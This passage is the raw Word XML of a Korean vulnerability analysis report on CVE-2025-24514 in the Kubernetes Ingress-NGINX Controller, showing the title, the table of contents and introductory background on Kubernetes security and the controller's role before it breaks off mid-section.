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E8390" w14:textId="63C1F37A" w:rsidR="00E7627A" w:rsidRPr="00E7627A" w:rsidRDefault="00E7627A" w:rsidP="00E7627A">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E7627A">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">CVE-2025-24514 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">상세 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E7627A">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>분석 보고서</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F4FA4E" w14:textId="354A1530" w:rsidR="00E27F85" w:rsidRPr="00E7627A" w:rsidRDefault="00E27F85" w:rsidP="00981A85">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="347846A0" w14:textId="7E8897B9" w:rsidR="00E27F85" w:rsidRPr="00981A85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>작성자: 김주형</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053A3A2D" w14:textId="77777777" w:rsidR="00E27F85" w:rsidRPr="00981A85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
        </w:rPr>
        <w:t>목차</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7803E007" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>서론</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B7F26" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>취약점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개요</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512E734F" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>기술적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배경</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143DC19F" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>취약점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상세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분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F6AFEF" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>공격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시나리오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및</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PoC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B5C5DF" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>영향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및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위험도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평가</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422E0072" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>대응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방안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및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패치</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A52FAA5" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>탐지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및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모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19406F22" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a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유사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취약점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벡터</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B93D54C" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>결론</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E4C3BF" w14:textId="4B8650EC" w:rsidR="00E27F85" w:rsidRDefault="00C97778" w:rsidP="009E3DDA">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>참고문헌</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B854B5">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B362BF7" w14:textId="15EB68DC" w:rsidR="00E27F85" w:rsidRPr="00F630FB" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서론</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FB43D3" w14:textId="6789D133" w:rsidR="00981A85" w:rsidRPr="00981A85" w:rsidRDefault="00981A85" w:rsidP="00981A85">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">1.1. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubernetes</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>중요성</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B163E3" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubernetes</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는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현대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클라우드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인프라의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핵심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플랫폼으로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컨테이너화된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애플리케이션의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배포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확장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관리를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자동화합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>그러나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이러한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유연성과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확장성은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동시에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새로운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보안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위협에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노출될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수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있는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복잡성을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동반합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터는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컨테이너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네트워크</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, API, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>데이터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저장소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등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다양한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공격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표면을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가지며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악의적인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행위자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악성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코드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취약한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컨테이너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이미지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권한이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과도한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사용자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등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여러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보안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위협에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직면해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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05449D37" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적절한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보안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통제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없이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클러스터가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침해될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경우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단일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애플리케이션을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넘어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전체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인프라의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기밀성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무결성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가용성이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위협받을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수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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>따라서</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경에서는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계층적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보안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통제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최소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권한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원칙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네트워크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및</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> API </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안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지속적인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모니터링이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필수적입니다</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236FABA0" w14:textId="79E9468E" w:rsidR="00981A85" w:rsidRPr="00981A85" w:rsidRDefault="00981A85" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">1.2. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>역할</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2947B5E8" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터에서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외부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트래픽을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내부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서비스로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안전하게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라우팅하는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핵심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컴포넌트입니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이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컨트롤러는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>리소스의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상태를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지속적으로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감시하고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그에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맞춰</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의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설정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파일을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자동으로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생성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및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적용하여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서비스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디스커버리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로드밸런싱</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, TLS </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>종료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인증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등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다양한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기능을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제공합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D9C109" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>컨트롤러는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의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컨트롤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루프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패턴을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따르며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클러스터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내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리소스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변화에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실시간으로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대응해</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>구성을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최신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상태로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유지합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이러한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자동화와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유연성은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운영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효율성을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높이지만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동시에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잘못된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설정이나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취약점이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발견될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경우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전체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트래픽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경로가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공격자에게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노출될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수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있는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위험도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내포하고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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6080DD00" w14:textId="6E7B7F91" w:rsidR="00981A85" w:rsidRPr="00981A85" w:rsidRDefault="00981A85" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">1.3. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>최근</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
